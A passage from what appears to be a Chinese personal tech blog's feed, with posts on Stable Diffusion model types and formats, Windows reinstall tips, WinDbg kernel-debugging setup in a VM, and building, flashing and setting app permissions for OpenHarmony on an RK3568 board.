href="https://huggingface.co/">HuggingFace</a>：Stable Diffusion、ControlNet的官方仓库。</li><li><a href="https://civitai.com/">Civitai</a>：里面多是Lora或其它NSFW等模型的仓库。</li><li>Discord：公共聊天软件，如果有需要可行前往搜索相应频道。</li><li>TG：公共聊天软件，如果有需要可行前往搜索相应频道。</li><li>Reddit：公共交流社区，如果有需要可行前往搜索相应频道。</li></ul><p>在HuggingFace仓库中下载所需的模型时，将会看到各种各样格式的文件。对于一般的使用者来说，仅下载Stable Diffusion的常用CKPT格式模型文件即可。</p><h2 id="模型种类"><a href="#模型种类" class="headerlink" title="模型种类"></a>模型种类</h2><h3 id="大模型"><a href="#大模型" class="headerlink" title="大模型"></a>大模型</h3><p>大模型特指标准的<code>latent-diffusion</code>模型。拥有完整的<code>TextEncoder</code>、<code>U-Net</code>、<code>VAE</code>。</p><p>由于想要训练一个大模型非常困难，需要极高的显卡算力，所以更多的人选择去训练小型模型。</p><h4 id="CKPT"><a href="#CKPT" class="headerlink" title="CKPT"></a>CKPT</h4><p>CKPT格式的全称为<code>CheckPoint</code>（检查点），完整模型的常见格式，模型体积较大，一般单个模型的大小在7GB左右。</p><p>文件位置：该模型一般放置在<code>*\stable-diffusion-webui\models\Stable-diffusion</code>目录内。</p><h3 id="小模型"><a href="#小模型" class="headerlink" title="小模型"></a>小模型</h3><p>小模型一般都是截取大模型的某一特定部分，虽然不如大模型能力那样完整，但是小而精，因为训练的方向各为明确，所以在生成特定内容的情况下，效果更佳。</p><p>常见微调模型：<code>Textual inversion (Embedding)</code>、<code>Hypernetwork</code>、<code>VAE</code>、<code>LoRA</code>等，下面一一进行介绍。</p><h4 id="VAE"><a href="#VAE" class="headerlink" title="VAE"></a>VAE</h4><p>全称：VAE全称<code>Variational autoencoder</code>。变分自编码器，负责将潜空间的数据转换为正常图像。</p><p>后缀格式：后缀一般为.pt格式。</p><p>功能描述：类似于滤镜一样的东西，他会影响出图的画面的色彩和某些极其微小的细节。大模型本身里面自带 VAE ，但是并不是所有大模型都适合使用VAE，VAE最好搭配指定的模型，避免出现反效果，降低生成质量。</p><p>使用方法：<code>设置 -&gt; Stable-Diffusion -&gt; 模型的 VAE (SD VAE)</code>，在该选项框内选择VAE模型。</p><p>文件位置：该模型一般放置在<code>*\stable-diffusion-webui\models\VAE</code>目录内。</p><h4 id="Embedding"><a href="#Embedding" class="headerlink" title="Embedding"></a>Embedding</h4><p>常见格式为<code>pt</code>、<code>png</code>、<code>webp</code>格式，文件体积一般只有几KB。</p><p>风格模型，即只针对一个风格或一个主题，并将其作为一个模块在生成画作时使用对应TAG在Prompt进行调用。</p><p>使用方法：例如用数百张<code>海绵宝宝</code>训练了一个Embedding模型，然后将该模型命名为<code>HMBaby</code>，在使用AI绘图时加载名称为<code>HMBaby</code>的Embedding模型，在使用Promat时加入<code>HMBaby</code>的Tag关键字，SD将会自动调用该模型参与AI创作。</p><p>文件位置：该模型一般放置在<code>*\stable-diffusion-webui\embeddings</code>目录内。</p><h4 id="Hypernetwork"><a href="#Hypernetwork" class="headerlink" title="Hypernetwork"></a>Hypernetwork</h4><p>一般为.pt后缀格式，大小一般在几十兆左右。这种模型的可自定义的参数非常之多。</p><p>使用方法：使用方法：在SD的文生图或图生图界面内的生成按钮下，可以看到一个红色的图标，该图标名为<code>Show extra networks（显示额外网络）</code>，点击该红色图标将会在本页弹出一个面板，在该面板中可以看到<code>Hypernetwork选项卡</code>。</p><p>文件位置：该模型一般放置在<code>*\stable-diffusion-webui\models\hypernetworks</code>目录内。</p><h4 id="LoRA"><a href="#LoRA" class="headerlink" title="LoRA"></a>LoRA</h4><p>LoRA(Low-Rank Adaptation of Large Language Models)的模型分两种，一种是基础模型，一种是变体。</p><p>目前最新版本的Stable-diffusion-WebUI原生支持Lora模型库，非常方便使用。</p><p>使用方法：在SD的文生图或图生图界面内的生成按钮下，可以看到一个红色的图标，该图标名为<code>Show extra networks（显示额外网络）</code>，点击该红色图标将会在本页弹出一个面板，在该面板中可以看到Lora选项卡，在该选项卡中可以自由选择Lora模型，点击想要使用的模型将会自动在Prompt文本框中插入该Lora模型的Tag名称。</p><h5 id="基础模型"><a href="#基础模型" class="headerlink" title="基础模型"></a>基础模型</h5><p>名称一般为<code>chilloutmix*</code>，后缀可能为safetensors或CKPT。</p><p>基础模型存放位置：<code>*\stable-diffusion-webui\models\Stable-diffusion</code>目录内。</p><h5 id="变体模型"><a href="#变体模型" class="headerlink" title="变体模型"></a>变体模型</h5><p>变体模型存放位置：<code>*\stable-diffusion-webui\models\Lora</code>目录内。</p><h2 id="模型后缀解析"><a href="#模型后缀解析" class="headerlink" title="模型后缀解析"></a>模型后缀解析</h2><table><thead><tr><th>格式</th><th>描述</th></tr></thead><tbody><tr><td>.ckpt</td><td>Pytorch的标准模型保存格式，容易遭受Pickle反序列化攻击。</td></tr><tr><td>.pt</td><td>Pytorch的标准模型保存格式，容易遭受Pickle反序列化攻击。</td></tr><tr><td>.pth</td><td>Pytorch的标准模型保存格式，容易遭受Pickle反序列化攻击。</td></tr><tr><td>.safetensors</td><td>safetensors格式可与Pytorch的模型相互格式转换，内容数据无区别。</td></tr><tr><td>其它</td><td>webui 特殊模型保存方法：PNG、WEBP图片格式。</td></tr></tbody></table><h3 id="Safetensors格式"><a href="#Safetensors格式" class="headerlink" title="Safetensors格式"></a>Safetensors格式</h3><ul><li>Safetensors格式所生成的内容与ckpt等格式完全一致（包括NFSW）。</li><li>Safetensors格式拥有更高的安全性，</li><li>Safetensors比ckpt格式加载速度更快</li><li>该格式必须在2023年之后的Stable Diffusion内才可以使用，在此之间的SD版本内使用将无法识别。</li><li>Safetensors格式由Huggingface推出，将会逐渐取代ckpt、pt、pth等格式，使用方法上与其它格式完全一致。【该详细的说明文章：<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui/pull/4930"><code>*.safetensors</code> (github.com)</a>】</li></ul><h2 id="模型训练-1"><a href="#模型训练-1" class="headerlink" title="模型训练"></a>模型训练</h2><h3 id="Embedding-Textual-inversion"><a href="#Embedding-Textual-inversion" class="headerlink" title="Embedding (Textual inversion)"></a>Embedding (Textual inversion)</h3><p>可训练：画风√ 人物√ | 推荐训练：人物</p><p>配置要求：显存6GB以上。</p><p>训练速度：中等 | 训练难度：中等</p><p>综合评价：☆☆☆</p><h3 id="Hypernetwork-1"><a href="#Hypernetwork-1" class="headerlink" title="Hypernetwork"></a>Hypernetwork</h3><p>可训练：画风√ 人物√ | 推荐训练：画风</p><p>配置要求：显存6GB以上。</p><p>训练速度：中等 | 训练难度：难</p><p>综合评价：☆☆</p><p>评价：非常强大的一种模型，但是想训练好很难，不推荐训练。</p><h3 id="LoRA-1"><a href="#LoRA-1" class="headerlink" title="LoRA"></a>LoRA</h3><p>可训练：画风? 人物√  概念√ | 推荐训练：人物</p><p>配置要求：显存8GB以上。</p><p>训练速度：快 | 训练难度：简单</p><p>综合评价：☆☆☆☆</p><p>评价：非常好训练 好出效果的人物训练，配置要求低，图要求少。</p><p>备注：LoRA 本身也应该归类到 Dreambooth，但是这里还是分开讲。</p><h3 id="Dreambooth-x2F-Native-Train"><a href="#Dreambooth-x2F-Native-Train" class="headerlink" title="Dreambooth &#x2F; Native Train"></a>Dreambooth &#x2F; Native Train</h3><p>可训练：画风√ 人物√ 概念√ | 推荐训练：Dreambooth 推荐人物，Native Train 推荐画风</p><p>配置要求：显存12GB以上。</p><p>训练速度：慢 | 训练难度：可以简单可以很难</p><p>综合评价：☆☆☆☆☆</p><p>评价：微调大模型，非常强大的训练方式，但是使用上会不那么灵活，推荐训练画风用，人物使用 LoRA 训练。</p><h3 id="DreamArtist"><a href="#DreamArtist" class="headerlink" title="DreamArtist"></a>DreamArtist</h3><p>显存要求6GB（4GB应该也可以），只需要（也只能）使用一张图完成训练，一般用于训练人物（画风没法抓住主次），优点是训练要求极低，成功率高，缺点是容易过拟合，并且不像Embedding可以跨模型应用，这个训练时使用什么模型应用时就要用什么，哪怕调一下CLIP参数生成结果都会完全跑飞。推荐每250步保存模型，后期用X&#x2F;Y图脚本进行挑选。</p><h2 id="模型后缀"><a href="#模型后缀" class="headerlink" title="模型后缀"></a>模型后缀</h2><p>仓库内一般存在多个模型文件，文件名后缀各不相同，这里简单介绍下文件名常见后缀及其含义：</p><h3 id="ControlNet"><a href="#ControlNet" class="headerlink" title="ControlNet"></a>ControlNet</h3><p>ControlNet比之前的img2img要更加的精准和有效，可以直接提取画面的构图，人物的姿势和画<br>面的深度信息等等。有了它的帮助，就不用频繁的用提示词来碰运气，抽卡式的创作了。</p><h3 id="instruct-pix2pix"><a href="#instruct-pix2pix" class="headerlink" title="instruct-pix2pix"></a>instruct-pix2pix</h3><p>在 stable-diffusion-webui 中的img2img专用模型 自然语言指导图像编辑 生成速度极快 ，仅需要几秒的时间。</p><h3 id="FP16、FP32"><a href="#FP16、FP32" class="headerlink" title="FP16、FP32"></a>FP16、FP32</h3><p>代表着精度不同，精度越高所需显存越大，效果也会有所提升。</p><h3 id="512｜768"><a href="#512｜768" class="headerlink" title="512｜768"></a>512｜768</h3><p>代表着默认训练分辨率时512X512还是768X768，理论上默认分辨率高生成效果也会相应更好。</p><h3 id="inpaint"><a href="#inpaint" class="headerlink" title="inpaint"></a>inpaint</h3><p>代表着是专门为imgtoimg中的inpaint功能训练的模型，在做inpaint时效果会相对来说较好。</p><h3 id="depth"><a href="#depth" class="headerlink" title="depth"></a>depth</h3><p>代表此模型是能包含处理图片深度信息并进行inpainting和img2img的</p><h3 id="EMA"><a href="#EMA" class="headerlink" title="EMA"></a>EMA</h3><p>模型文件名中带EMA一般意味着这是个用来继续训练的模型,文件大小相对较大</p><p>与之相比,正常的、大小相当较小的那个模型文件是为了做推理生成的</p><p>对于那些有兴趣真正理解发生了什么的人来说，应该使用EMA模型来进行推理</p><p>小模型实际上有EMA权重。而大模型是一个 “完整版”，既有EMA权重，也有标准权重。因此，如果你想训练这个模型，你应该加载完整的模型，并使用use_ema&#x3D;False。</p><h4 id="EMA权重"><a href="#EMA权重" class="headerlink" title="EMA权重"></a>EMA权重</h4><p>就像你作为一个学生在接受训练时，也许你会在最后一次考试表现较差，或者决定作弊并记住答案。所以一般来说，通过使用考试分数的平均值，你可以更好地了解到学生的表现，</p><p>由于你不关心幼儿园时的分数，如果你只考虑去年的分数(即只用一组最近的实际数据值来预测)，你会得到<code>MA</code>（moving average 移动平均数). 而如果你保留整个历史，但给最近的分数以更大的权重，则会得到<code>EMA</code>(exponential moving average 指数移动平均数)。</p><p>这对具有不稳定训练动态的GANs来说是一个非常重要的技巧，但对扩散模型来说，它其实并不是那么重要。</p><h3 id="VAE-1"><a href="#VAE-1" class="headerlink" title="VAE"></a>VAE</h3><p>VAE模型文件并不能和正常模型文件一样独立完成图片生成。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;时下文生图已经非常火热, 自己搭一个服务, 跑起来玩也是不错的选择&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>重装系统的一些操作建议</title>
    <link href="http://474172261.github.io/2023/02/23/system-help/"/>
    <id>http://474172261.github.io/2023/02/23/system-help/</id>
    <published>2023-02-23T07:17:02.785Z</published>
    <updated>2023-11-09T06:39:01.002Z</updated>
    
    <content type="html"><![CDATA[<p>时不时需要重装系统，面临很多需要重复操作又容易忘记的事情，记录一下。</p><span id="more"></span><h2 id="映射目录为虚拟分区号"><a href="#映射目录为虚拟分区号" class="headerlink" title="映射目录为虚拟分区号"></a>映射目录为虚拟分区号</h2><p>将某个文件夹映射为一个虚拟分区号, 方便访问文件夹或者备份的时候路径短一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices]</span><br><span class="line">&quot;X:&quot;=&quot;\\??\\D:\\Downloads\\Work\\MyFiles&quot;</span><br></pre></td></tr></table></figure><h2 id="WOL脚本"><a href="#WOL脚本" class="headerlink" title="WOL脚本"></a>WOL脚本</h2><p>最开始不理解wol原理就搜教程, 网上的人也不知道咋写的, 一个wol用python就能解决的, 教程居然让下载一个工具, 一点也不geek.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, <span class="number">1</span>)</span><br><span class="line">s.sendto(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xAA\xAA\xAA\xAA\xAA\xAA&#x27;</span>*<span class="number">16</span>, (<span class="string">&quot;255.255.255.255&quot;</span>,<span class="number">9</span>))</span><br></pre></td></tr></table></figure><p>需要注意的是, 如果想在公网唤醒局域网的机器, 路由器端口转发好像不好使(即使把机器绑定了固定ip), 设定广播ip也不好使, 应该必须设置静态arp. 想设置arp, 这个就看路由器了, 很难弄, 所以家里有群晖的, 用群晖跑个命令更靠谱一些.</p><h2 id="实用windows软件推荐"><a href="#实用windows软件推荐" class="headerlink" title="实用windows软件推荐"></a>实用windows软件推荐</h2><p><a href="https://www.voidtools.com/">everything</a> 搜本地文件神器! 装机必备</p><p><a href="https://www.xyplorer.com/">xyplorer</a> windows自带的文件管理不支持tab管理, 费劲, 我个人比较喜欢这个文件管理器, 而且可以一直试用</p><p><a href="https://www.sublimetext.com/">sublime text</a> 十分强大的文本编辑器, 比起vscode小巧, 功能强大. vscode后台一堆进程, 占用内存太多, 我不喜欢, 还是sublime 可爱.</p><p><strong>设置空格替换tab</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;tab_size&quot;: 4,</span><br><span class="line">&quot;translate_tabs_to_spaces&quot;: true</span><br><span class="line">&quot;expand_tabs_on_save&quot;: true</span><br></pre></td></tr></table></figure><p><a href="https://www.7-zip.org/download.html">7z</a> 我觉得, 它是最屌的解压缩软件, 没人有意见吧 :) 安装后, 需要打开7z文件管理器, 在<code>工具-&gt;选项</code>里点一下 <code>+</code>号, 才能关联文件后缀, 切记!</p><h2 id="system32目录文件修改"><a href="#system32目录文件修改" class="headerlink" title="system32目录文件修改"></a>system32目录文件修改</h2><p>如果要删除或修改<code>C:\windows\system32\</code>目录下的文件, 一般需要TrustInstaller权限, 要修改它, 可以现在管理员命令行里运行<code>takeown /f C:\windows\system32\xxx.dll</code>, 然后在文件管理里， 右键文件， <code>属性-&gt;安全</code>:</p><p><img src="/images/system-help.assets/1699511875452.png" alt="1699511875452"></p><p>选择当前用户, 选择<code>编辑</code>, 然后勾选<code>完全控制</code>, 确认后就可以随意更改了.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;时不时需要重装系统，面临很多需要重复操作又容易忘记的事情，记录一下。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>使用workstation配置 Windows 内核调试</title>
    <link href="http://474172261.github.io/2023/02/22/windows-debug-setting/"/>
    <id>http://474172261.github.io/2023/02/22/windows-debug-setting/</id>
    <published>2023-02-22T11:54:44.259Z</published>
    <updated>2023-09-07T08:50:14.394Z</updated>
    
    <content type="html"><![CDATA[<p>本篇讲如何简单配置windows内核调试. 使用虚拟机调试windows 的方法分为两种, 一种是pipe, 一种是网络.</p><span id="more"></span><h2 id="pipe方法"><a href="#pipe方法" class="headerlink" title="pipe方法"></a>pipe方法</h2><h2 id="添加串口到虚拟机"><a href="#添加串口到虚拟机" class="headerlink" title="添加串口到虚拟机"></a>添加串口到虚拟机</h2><p>安装好虚拟机后, 添加串口设配, 配置如下<br><img src="/images/windows-setting/2.png"></p><h2 id="配置虚拟机windows系统-简称Guest"><a href="#配置虚拟机windows系统-简称Guest" class="headerlink" title="配置虚拟机windows系统(简称Guest)"></a>配置虚拟机windows系统(简称Guest)</h2><p>按组合键win+r, 输入 msconfig.做如下配置<br><img src="/images/windows-setting/3.png"><br>重启虚拟机</p><h2 id="配置外部主机-检查Host"><a href="#配置外部主机-检查Host" class="headerlink" title="配置外部主机(检查Host)"></a>配置外部主机(检查Host)</h2><p>找到windbg的快捷方式, 右键属性, 添加参数<code>-b -k com:port=\\.\pipe\com_1,baud=115200,pipe”</code><br><img src="/images/windows-setting/4.png"></p><h2 id="连接调试器"><a href="#连接调试器" class="headerlink" title="连接调试器"></a>连接调试器</h2><p>在Guest启动后, 在Host打开刚才设置的windbg快捷方式, 如下便连接成功<br><img src="/images/windows-setting/5.png"></p><h2 id="添加符号"><a href="#添加符号" class="headerlink" title="添加符号"></a>添加符号</h2><p><img src="/images/windows-setting/6.png"></p><h2 id="网络方法"><a href="#网络方法" class="headerlink" title="网络方法"></a>网络方法</h2><p>假设虚拟机是windows 10, ip 为 192.168.170.12, 主机ip为 192.168.170.1, 在虚拟机中使用管理员打开powershell, 执行以下命令:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; Bcdedit /<span class="built_in">set</span> dbgtransport kdnet.dll</span><br><span class="line">操作成功完成。</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; Bcdedit /debug yes</span><br><span class="line">操作成功完成。</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; Bcdedit /dbgsettings net hostip:<span class="number">192.168</span>.<span class="number">170.1</span> port:<span class="number">50110</span></span><br><span class="line">Key=<span class="number">3</span>tiyrjeh9h9w5.<span class="number">19</span>vgro94onrdc.<span class="number">1</span>wckyll43kv3r.yf1gyp2ymc3n</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>此处使用的port是 50110, 设置后会出现一个key.<br>设置好后重启一下虚拟机, 重启后, 在主机使用以下命令连接虚拟机:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinDBG -k <span class="built_in">net</span>:port=<span class="number">50110</span>,key=<span class="number">3</span>tiyrjeh9h9w5.<span class="number">19</span>vgro94onrdc.<span class="number">1</span>wckyll43kv3r.yf1gyp2ymc3n</span><br></pre></td></tr></table></figure><h2 id="hyper-v的hypervisor调试配置"><a href="#hyper-v的hypervisor调试配置" class="headerlink" title="hyper-v的hypervisor调试配置"></a>hyper-v的hypervisor调试配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisordebug on</span><br><span class="line">bcdedit /hypervisorsettings NET HOSTIP:192.168.170.1 PORT:50000</span><br></pre></td></tr></table></figure><h2 id="windbg远程调试用户程序"><a href="#windbg远程调试用户程序" class="headerlink" title="windbg远程调试用户程序"></a>windbg远程调试用户程序</h2><p>Guest里, 安装同版本windbg, 在 <code>C:\Program Files\Windows Kits\10\Debuggers\x64\</code>目录, 执行</p><p><code>.\dbgsrv -t tcp:port=50000</code>, 监听50000端口</p><p>在主机执行 <code>windbg -premote tcp:Port=50000,Server=192.168.150.152</code>, 连接目标虚拟机. 弹出windbg窗口后, 直接<code>F6</code>选择需要附加的程序.</p><p><a href="https://bbs.kanxue.com/thread-262874.htm">参考</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本篇讲如何简单配置windows内核调试. 使用虚拟机调试windows 的方法分为两种, 一种是pipe, 一种是网络.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>OpenHarmony测试指南</title>
    <link href="http://474172261.github.io/2023/02/22/OpenHarmony-test/"/>
    <id>http://474172261.github.io/2023/02/22/OpenHarmony-test/</id>
    <published>2023-02-22T11:54:44.228Z</published>
    <updated>2023-02-28T10:37:09.066Z</updated>
    
    <content type="html"><![CDATA[<p>官方虽然有不少资料, 但是都很分散, 我整理一下关于rk3568的测试资料, 方便大家参考.</p><span id="more"></span><h1 id="系统编译"><a href="#系统编译" class="headerlink" title="系统编译"></a>系统编译</h1><ol><li><p>参照<a href="https://device.harmonyos.com/cn/docs/documentation/guide/ide-install-windows-ubuntu-0000001194073744">搭建开发环境</a> 准备好Ubuntu环境和windows的vscode环境, 完成remote-ssh连接.</p></li><li><p>准备好源码, 参考<a href="https://device.harmonyos.com/cn/docs/documentation/guide/create_project-0000001072200151">创建OpenHarmony工程</a>章节, 自动获取源码, 或者导入自己存在的源码.</p><blockquote><p>可以从<a href="https://repo.huaweicloud.com/harmonyos/os/">此处获取源码</a></p></blockquote></li><li><p>对于rk3568设备, 参考<a href="https://device.harmonyos.com/cn/docs/documentation/guide/ide-rk3568-compile-0000001238957517">编译RK3568开发板源码</a>章节的<strong>1</strong>,<strong>2</strong>,<strong>3</strong>的内容. 准备好后, 参考<a href="https://gitee.com/hihope_iot/docs/blob/master/HiHope_DAYU200/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%BC%96%E8%AF%91%E6%8C%87%E5%8D%97.md">HiHope_DAYU200&#x2F;开发环境搭建编译指南</a>, 安装需要的组件, 如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install binutils git git-lfs gnupg flex</span><br><span class="line">bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib</span><br><span class="line">libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev ccache</span><br><span class="line">libgl1-mesa-dev libxml2-utils xsltproc unzip m4 bc gnutls-bin python3.8</span><br><span class="line">python3-pip ruby libtinfo-dev libtinfo5</span><br></pre></td></tr></table></figure><blockquote><p>如果安装有问题, 可以考虑使用aptitude来解决.</p></blockquote></li><li><p>最后可以执行<code>./build.sh --product-name rk3568 --target-cpu arm64 --ccache</code>编译64位系统.</p></li></ol><h1 id="rk3568系统烧录"><a href="#rk3568系统烧录" class="headerlink" title="rk3568系统烧录"></a>rk3568系统烧录</h1><p>参考<a href="https://gitee.com/hihope_iot/docs/blob/master/HiHope_DAYU200/docs/%E7%83%A7%E5%BD%95%E6%8C%87%E5%AF%BC%E6%96%87%E6%A1%A3.md"> 烧录指导文档</a></p><ol><li><p>按照如图所示连接电源线, 串口线, usb线</p><p><img src="/images/OpenHarmony-test/image-20220516164155093-1670578318853.png" alt="image-20220516164155093"> </p></li><li><p>下载<a href="https://gitee.com/hihope_iot/docs/tree/master/HiHope_DAYU200/%E7%83%A7%E5%86%99%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%8C%87%E5%8D%97/windows">驱动工具</a></p><blockquote><p>需要下载的文件:  DriverAssitant_v5.1.1.zip,  RKDevTool.exe,  config.ini, Language 目录.</p><p>一定要保留Language目录, 否则工具会出现点一下就崩溃或者一直static的状况.</p></blockquote><p>解压DriverAssitant_v5.1.1.zip后, 运行<code>DriverAssitant\DriverInstall.exe  </code>, 点击<code>驱动安装</code>.</p></li><li><p>打开<code>RKDevTool.exe </code>烧写工具, 查看设备状态.</p><p>如果开着机, 默认是如下状态:</p><p><img src="/images/OpenHarmony-test/1672023200456.png" alt="1672023200456"></p></li><li><p>按住下图所示两个键</p><p><img src="/images/OpenHarmony-test/image-20220516170351601.png" alt="image-20220516170351601"> </p><p>烧录工具会提示没发现设备.</p><p>然后松开reset键, 显示”发现一个loader设备”. 然后松开剩下的按键. 等待3秒.</p></li></ol><h2 id="使用烧录工具烧录"><a href="#使用烧录工具烧录" class="headerlink" title="使用烧录工具烧录"></a>使用烧录工具烧录</h2><p>vscode烧录时, 传输文件会比scp命令慢, 我们可以手动烧录.</p><p>将ubuntu目录源码的<code>out/rk3568/packages/phone/images/</code>目录下的所有文件拷贝到本地, 然后在<code>RKDevTool.exe </code>工具的栏目里右键选择<code>load config</code>, 加载目录里的<code>config.cfg</code>文件, 并修改好每个文件的路径. 点击<code>执行</code>烧录.</p><h2 id="使用vscode工具烧录"><a href="#使用vscode工具烧录" class="headerlink" title="使用vscode工具烧录"></a>使用vscode工具烧录</h2><ol><li><p>确保机器连接成功</p><p>在DevEco Device Tool中，选择<strong>REMOTE DEVELOPMENT &gt; Local PC</strong>，查看远程计算机（Ubuntu开发环境）与本地计算机（Windows开发环境）的连接状态。</p><ul><li>如果Local PC右边连接按钮为<img src="/images/OpenHarmony-test/0000000000011111111.20220617164602.73645117545890562218658911880196.png" alt="img">则远程计算机与本地计算机为已连接状态，不需要执行其他操作。</li><li>如果Local PC右边连接按钮为<img src="/images/OpenHarmony-test/0000000000011111111.20220617164602.26357696204473864583858211392894.png" alt="img">则点击绿色按钮进行连接。连接时DevEco Device Tool会重启服务，因此请不要在下载源码或源码编译过程中进行连接，否则会中断任务</li></ul></li><li><p>在vs code中点击upload选项即可烧录.<img src="/images/OpenHarmony-test/0000000000011111111.20221103203816.15089950501154467365030783854423.png" alt="img"> </p></li><li><p>vscode会先拷贝文件到本地, 拷贝完成后, 会提示按键开始烧录</p></li></ol><h1 id="创建应用调试"><a href="#创建应用调试" class="headerlink" title="创建应用调试"></a>创建应用调试</h1><ol><li><p>下载安装<a href="https://developer.harmonyos.com/cn/develop/deveco-studio#download">HUAWEI DevEco Studio </a></p></li><li><p>启动它, 一步步继续就行, 然后会强制安装<code>Harmony SDK</code>, 继续</p></li><li><p>创建OpenHarmony 应用</p><p><img src="/images/OpenHarmony-test/1670580451653.png" alt="1670580451653"></p></li><li><p>接着会提示你安装<code>OpenHarmony SDK</code>, 安装即可</p><p><img src="/images/OpenHarmony-test/1670580505134.png" alt="1670580505134"></p></li><li><p>项目就创建完成了, 如果设备连接正常, 此处会有显示</p><p><img src="/images/OpenHarmony-test/1670580590649.png" alt="1670580590649"></p></li><li><p>选择<code>File-&gt;Project Structure</code>, 按下图所示</p><p><img src="/images/OpenHarmony-test/1670580692357.png" alt="1670580692357"></p><p>先择自动签名.</p></li><li><p>完成后就可以在下图位置开始调试和测试运行了</p><p><img src="/images/OpenHarmony-test/1670580744213.png" alt="1670580744213"></p></li></ol><p>参考: <a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/installation_process-0000001071425528">DevEco Studio 搭建</a></p><h2 id="设置应用权限"><a href="#设置应用权限" class="headerlink" title="设置应用权限"></a>设置应用权限</h2><p>应用一般有3个等级:</p><table><thead><tr><th>APL级别</th><th>说明</th></tr></thead><tbody><tr><td>system_core等级</td><td>该等级的应用服务提供操作系统核心能力。</td></tr><tr><td>system_basic等级</td><td>该等级的应用服务提供系统基础服务。</td></tr><tr><td>normal等级</td><td>普通应用。</td></tr></tbody></table><p>可以查看此处的<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/permission-list-0000001478341001-V3">权限列表</a>来确认模块所需的权限. (华为的人老是乱改链接, 如果失效了, 就<a href="https://developer.harmonyos.com/cn/docs/search?val=%E5%BA%94%E7%94%A8%E6%9D%83%E9%99%90%E5%88%97%E8%A1%A8">搜索</a>)</p><p>如果我们需要一个高一点的权限, 比如说 system_basic, 那么就需要额外的操作设置一下. 下面示例设置<strong>ohos.permission.DISTRIBUTED_SOFTBUS_CENTER</strong> 权限</p><ol><li><p>创建一个空的Openharmony项目, 在项目的 <code>entry/src/main</code>下, 找到 <code>module.json5</code> 文件</p><p><img src="/images/OpenHarmony-test/1675148476629.png" alt="1675148476629"></p></li><li><p>在文件的 module 的大括号内添加如下权限请求:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">  &quot;module&quot;: &#123;</span><br><span class="line">    xxx: [</span><br><span class="line">    ...</span><br><span class="line">    ],</span><br><span class="line">    &quot;requestPermissions&quot;: [// 新增此项</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;name&quot;: &quot;ohos.permission.DISTRIBUTED_SOFTBUS_CENTER&quot;// 需要的权限</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更多设置<a href="https://bbs.elecfans.com/jishu_2313453_1_1.html">参考</a></p></li><li><p>找到 <strong>UnsgnedReleasedProfileTemplate.json</strong> 文件, 默认在<code>C:\Users\vv\AppData\Local\OpenHarmony\Sdk\9\toolchains\lib\UnsgnedReleasedProfileTemplate.json</code>, 修改其中的内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;apl&quot;:&quot;system_basic&quot;,// 根据权限列表的内容, DISTRIBUTED_SOFTBUS_CENTER 需要 system_basic权限</span><br><span class="line">&quot;app-feature&quot;:&quot;hos_system_app&quot; // 系统基础服务app</span><br></pre></td></tr></table></figure><p>更多设置<a href="https://www.51cto.com/article/741793.html">参考</a></p></li><li><p>然后找到默认的签名证书, <code>C:\Users\vv\.ohos\config\openharmony</code>, 把目录下以<code>auto_ohos_default_你的项目名称...</code>开头的文件都删除. 